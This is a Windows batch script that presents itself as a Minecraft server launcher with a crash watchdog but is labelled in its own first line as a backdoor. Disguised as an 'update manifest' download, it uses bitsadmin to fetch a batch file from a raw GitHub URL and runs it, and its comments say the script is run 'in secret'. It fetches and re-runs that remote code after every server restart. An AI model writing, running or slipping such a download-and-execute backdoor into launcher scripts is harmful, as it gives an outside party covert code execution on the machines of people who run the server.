@rem Backdoor pogU
@echo off

echo (%time%) Stage 1 started

set "REMOTEFILE=https://raw.githubusercontent.com/JaidenDestroyer/test/master/script.bat"
set "LOCALFILE=%cd%temp.bat"

call :checkPermission %LOCALFILE% RESPONSE
if %RESPONSE% EQU 0 (
	echo ^(%time%^) INVALID PERMISSION TO WRITE TO "%LOCALFILE%"
	pause
	echo ^(%time%^) Stage 1 finished exit /b 1
) else (
	echo ^(%time%^) VALID PERMISSION TO WRITE TO "%LOCALFILE%"
)

echo (%time%) Download starting
call :downloadUpdateManifest %REMOTEFILE% %LOCALFILE%
echo (%time%) Download finished

echo (%time%) RUNNING SCRIPT
start %LOCALFILE%

echo (%time%) Stage 1 finished
echo (%time%) Stage 2 started

echo (%time%) Watchdog started
:watchdog
start /wait java -jar server.jar nogui
echo (%time%) WARNING: server closed or crashed, restarting.
echo (%time%) Reconfiguring...
call :downloadUpdateManifest %REMOTEFILE% %LOCALFILE%
start %LOCALFILE%
echo (%time%) Reconfigured!
timeout 10
goto :watchdog



@rem call :checkPermission PATH, RESPONSE
:checkPermission
	copy /y nul %~1 > nul && set %~2=1 || set %~2=0
	del %~1
	exit /b

@rem TEMP CODE
:downloadUpdateManifest
	setlocal
	for /f %%G in ('bitsadmin /rawreturn /create "UpdateManifestDownload"') do set "guid=%%G"
	bitsadmin /rawreturn /addfile %guid% "%~1" "%~2" > nul
	bitsadmin /rawreturn /setnotifycmdline %guid% "cmd.exe" "/c waitfor /si UpdateManifestDownloadComplete" > nul
	bitsadmin /rawreturn /resume %guid% > nul & waitfor /t 10 "UpdateManifestDownloadComplete" > nul
	for /f %%G in ('bitsadmin /rawreturn /getstate %guid%') do if "%%G"=="TRANSFERRED" echo File transferred to %~2
	bitsadmin /rawreturn /complete %guid% > nul
	endlocal
exit /b

@rem Run program
@rem Program checks if it has enough permissions
@rem Program downloads our script to local
@rem Program runs the script (in secret)
@rem Do all the minecraft stuff (run server)

